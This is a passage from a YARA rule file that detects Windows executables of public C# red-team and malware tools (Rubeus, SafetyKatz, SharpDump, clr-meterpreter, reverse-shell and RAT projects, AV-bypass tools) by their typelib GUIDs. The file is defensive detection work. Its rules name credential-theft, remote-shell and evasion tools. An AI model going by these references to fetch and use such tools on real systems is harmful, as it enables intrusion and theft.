\"30b2e0cf-34dd-4614-a5ca-6578fb684aea\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_ESC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NetSPI/ESC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"06260ce5-61f4-4b81-ad83-7d01c3b37921\" ascii nocase wide\n        $typelibguid1 = \"87fc7ede-4dae-4f00-ac77-9c40803e8248\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Csharp_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Csharp-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5fd7f9fc-0618-4dde-a6a0-9faefe96c8a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_bantam {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/gellin/bantam\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"14c79bda-2ce6-424d-bd49-4f8d68630b7b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpTask {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpTask\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"13e90a4d-bf7a-4d5a-9979-8b113e3166be\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsPlague {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/RITRedteam/WindowsPlague\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"cdf8b024-70c9-413a-ade3-846a43845e99\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Misc_CSharp {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/Misc-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"d1421ba3-c60b-42a0-98f9-92ba4e653f3d\" ascii nocase wide\n        $typelibguid1 = \"2afac0dd-f46f-4f95-8a93-dc17b4f9a3a1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpSpray {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpSpray\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"51c6e016-1428-441d-82e9-bb0eb599bbc8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Obfuscator {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Obfuscator\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8fe5b811-a2cb-417f-af93-6a3cf6650af1\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SafetyKatz {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SafetyKatz\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8347e81b-89fc-42a9-b22c-f59a6a572dec\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Dropless_Malware {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Dropless-Malware\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"23b739f7-2355-491e-a7cd-a8485d39d6d6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UAC_SilentClean {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/EncodeGroup/UAC-SilentClean\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"948152a4-a4a1-4260-a224-204255bfee72\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DesktopGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/DesktopGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"e6aa0cd5-9537-47a0-8c85-1fbe284a4380\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_wsManager {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/guillaC/wsManager\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9480809e-5472-44f3-b076-dcdf7379e766\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_UglyEXe {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fashionproof/UglyEXe\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"233de44b-4ec1-475d-a7d6-16da48d6fc8d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"79c9bba3-a0ea-431c-866c-77004802d8a0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_EducationalRAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/securesean/EducationalRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8a18fbcf-8cac-482d-8ab7-08a44f0e278e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Stealth_Kid_RAT {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ctsecurity/Stealth-Kid-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"bf43cd33-c259-4711-8a0e-1a5c6c13811d\" ascii nocase wide\n        $typelibguid1 = \"e5b9df9b-a9e4-4754-8731-efc4e2667d88\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCradle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/anthemtotheego/SharpCradle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"f70d2b71-4aae-4b24-9dae-55bc819c78bb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cnsimo/BypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4e7c140d-bcc4-4b15-8c11-adb4e54cc39a\" ascii nocase wide\n        $typelibguid1 = \"cec553a7-1370-4bbc-9aae-b2f5dbde32b0\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_hanzoInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/P0cL4bs/hanzoInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"32e22e25-b033-4d98-a0b3-3d2c3850f06c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_clr_meterpreter {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/OJ/clr-meterpreter\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"6840b249-1a0e-433b-be79-a927696ea4b3\" ascii nocase wide\n        $typelibguid1 = \"67c09d37-ac18-4f15-8dd6-b5da721c0df6\" ascii nocase wide\n        $typelibguid2 = \"e05d0deb-d724-4448-8c4c-53d6a8e670f3\" ascii nocase wide\n        $typelibguid3 = \"c3cc72bf-62a2-4034-af66-e66da73e425d\" ascii nocase wide\n        $typelibguid4 = \"7ace3762-d8e1-4969-a5a0-dcaf7b18164e\" ascii nocase wide\n        $typelibguid5 = \"3296e4a3-94b5-4232-b423-44f4c7421cb3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BYTAGE {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/KNIF/BYTAGE\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8e46ba56-e877-4dec-be1e-394cb1b5b9de\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_MultiOS_ReverseShell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/belane/MultiOS_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"df0dd7a1-9f6b-4b0f-801e-e17e73b0801d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HideFromAMSI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0r13lc0ch4v1/HideFromAMSI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"b91d2d44-794c-49b8-8a75-2fbec3fe3fe3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DotNetAVBypass_Master {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/lockfale/DotNetAVBypass-Master\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4854c8dc-82b0-4162-86e0-a5bbcbc10240\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpDPAPI {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/SharpDPAPI\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"5f026c27-f8e6-4052-b231-8451c6a73838\" ascii nocase wide\n        $typelibguid1 = \"2f00a05b-263d-4fcc-846b-da82bd684603\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Telegra_Csharp_C2 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/sf197/Telegra_Csharp_C2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1d79fabc-2ba2-4604-a4b6-045027340c85\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpCompile {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/SpiderLabs/SharpCompile\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"63f81b73-ff18-4a36-b095-fdcb4776da4c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Carbuncle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Carbuncle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3f239b73-88ae-413b-b8c8-c01a35a0d92e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_OSSFileTool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/B1eed/OSSFileTool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"207aca5d-dcd6-41fb-8465-58b39efcde8b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Rubeus {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/Rubeus\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"658c8b7f-3664-4a95-9572-a3e5871dfc06\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Simple_Loader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cribdragg3r/Simple-Loader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"035ae711-c0e9-41da-a9a2-6523865e8694\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Minidump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/3xpl01tc0d3r/Minidump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"15c241aa-e73c-4b38-9489-9a344ac268a3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpBypassUAC {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FatRodzianko/SharpBypassUAC\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0d588c86-c680-4b0d-9aed-418f1bb94255\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpPack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Lexus89/SharpPack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid1 = \"b59c7741-d522-4a41-bf4d-9badddebb84a\" ascii nocase wide\n        $typelibguid2 = \"fd6bdf7a-fef4-4b28-9027-5bf750f08048\" ascii nocase wide\n        $typelibguid3 = \"6dd22880-dac5-4b4d-9c91-8c35cc7b8180\" ascii nocase wide\n        $typelibguid5 = \"f3037587-1a3b-41f1-aa71-b026efdb2a82\" ascii nocase wide\n        $typelibguid6 = \"41a90a6a-f9ed-4a2f-8448-d544ec1fd753\" ascii nocase wide\n        $typelibguid7 = \"3787435b-8352-4bd8-a1c6-e5a1b73921f4\" ascii nocase wide\n        $typelibguid8 = \"fdd654f5-5c54-4d93-bf8e-faf11b00e3e9\" ascii nocase wide\n        $typelibguid9 = \"aec32155-d589-4150-8fe7-2900df4554c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Salsa_tools {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Hackplayers/Salsa-tools\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"276004bb-5200-4381-843c-934e4c385b66\" ascii nocase wide\n        $typelibguid1 = \"cfcbf7b6-1c69-4b1f-8651-6bdb4b55f6b9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_WindowsDefender_Payload_Downloader {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/notkohlrexo/WindowsDefender-Payload-Downloader\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"2f8b4d26-7620-4e11-b296-bc46eba3adfc\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Privilege_Escalation {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/Privilege_Escalation\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"ed54b904-5645-4830-8e68-52fd9ecbb2eb\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Marauder {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/maraudershell/Marauder\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"fff0a9a3-dfd4-402b-a251-6046d765ad78\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AV_Evasion_Tool {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/1y0n/AV_Evasion_Tool\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"1937ee16-57d7-4a5f-88f4-024244f19dc6\" ascii nocase wide\n        $typelibguid1 = \"7898617d-08d2-4297-adfe-5edd5c1b828b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Fenrir {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nccgroup/Fenrir\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"aecec195-f143-4d02-b946-df0e1433bd2e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_StormKitty {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/LimerBoy/StormKitty\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"a16abbb4-985b-4db2-a80c-21268b26c73d\" ascii nocase wide\n        $typelibguid1 = \"98075331-1f86-48c8-ae29-29da39a8f98b\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Crypter_Runtime_AV_s_bypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/netreverse/Crypter-Runtime-AV-s-bypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c25e39a9-8215-43aa-96a3-da0e9512ec18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_RunAsUser {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/atthacks/RunAsUser\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9dff282c-93b9-4063-bf8a-b6798371d35a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_HWIDbypass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/yunseok/HWIDbypass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"47e08791-d124-4746-bc50-24bd1ee719a6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_XORedReflectiveDLL {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/XORedReflectiveDLL\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"c0e49392-04e3-4abb-b931-5202e0eb4c73\" ascii nocase wide\n        $typelibguid1 = \"30eef7d6-cee8-490b-829f-082041bc3141\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Sharp_Suite {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Sharp-Suite\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"467ee2a9-2f01-4a71-9647-2a2d9c31e608\" ascii nocase wide\n        $typelibguid1 = \"5611236e-2557-45b8-be29-5d1f074d199e\" ascii nocase wide\n        $typelibguid2 = \"447edefc-b429-42bc-b3bc-63a9af19dbd6\" ascii nocase wide\n        $typelibguid3 = \"eacaa2b8-43e5-4888-826d-2f6902e16546\" ascii nocase wide\n        $typelibguid4 = \"a3b7c697-4bb6-455d-9fda-4ab54ae4c8d2\" ascii nocase wide\n        $typelibguid5 = \"a5f883ce-1f96-4456-bb35-40229191420c\" ascii nocase wide\n        $typelibguid6 = \"28978103-d90d-4618-b22e-222727f40313\" ascii nocase wide\n        $typelibguid7 = \"252676f8-8a19-4664-bfb8-5a947e48c32a\" ascii nocase wide\n        $typelibguid8 = \"414187db-5feb-43e5-a383-caa48b5395f1\" ascii nocase wide\n        $typelibguid9 = \"0c70c839-9565-4881-8ea1-408c1ebe38ce\" ascii nocase wide\n        $typelibguid10 = \"0a382d9a-897f-431a-81c2-a4e08392c587\" ascii nocase wide\n        $typelibguid11 = \"629f86e6-44fe-4c9c-b043-1c9b64be6d5a\" ascii nocase wide\n        $typelibguid12 = \"f0d28809-b712-4380-9a59-407b7b2badd5\" ascii nocase wide\n        $typelibguid13 = \"956a5a4d-2007-4857-9259-51cd0fb5312a\" ascii nocase wide\n        $typelibguid14 = \"53f622eb-0ca3-4e9b-9dc8-30c832df1c7b\" ascii nocase wide\n        $typelibguid15 = \"72019dfe-608e-4ab2-a8f1-66c95c425620\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_rat_shell {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/stphivos/rat-shell\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"7a15f8f6-6ce2-4ca4-919d-2056b70cc76a\" ascii nocase wide\n        $typelibguid1 = \"1659d65d-93a8-4bae-97d5-66d738fc6f6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_dotnet_gargoyle {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/countercept/dotnet-gargoyle\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"76435f79-f8af-4d74-8df5-d598a551b895\" ascii nocase wide\n        $typelibguid1 = \"5a3fc840-5432-4925-b5bc-abc536429cb5\" ascii nocase wide\n        $typelibguid2 = \"6f0bbb2a-e200-4d76-b8fa-f93c801ac220\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_aresskit {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackVikingPro/aresskit\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"8dca0e42-f767-411d-9704-ae0ba4a44ae8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_DLL_Injector {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tmthrgd/DLL-Injector\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"4581a449-7d20-4c59-8da2-7fd830f1fd5e\" ascii nocase wide\n        $typelibguid1 = \"05f4b238-25ce-40dc-a890-d5bbb8642ee4\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_TruffleSnout {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/dsnezhkov/TruffleSnout\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"33842d77-bce3-4ee8-9ee2-9769898bb429\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Anti_Analysis {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Anti-Analysis\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"3092c8df-e9e4-4b75-b78e-f81a0058a635\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_BackNet {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/valsov/BackNet\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"9fdae122-cd1e-467d-a6fa-a98c26e76348\" ascii nocase wide\n        $typelibguid1 = \"243c279e-33a6-46a1-beab-2864cc7a499f\" ascii nocase wide\n        $typelibguid2 = \"a7301384-7354-47fd-a4c5-65b74e0bbb46\" ascii nocase wide\n        $typelibguid3 = \"982dc5b6-1123-428a-83dd-d212490c859f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_AllTheThings {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/johnjohnsp1/AllTheThings\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-13\"\n    strings:\n        $typelibguid0 = \"0547ff40-5255-42a2-beb7-2ff0dbf7d3ba\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule 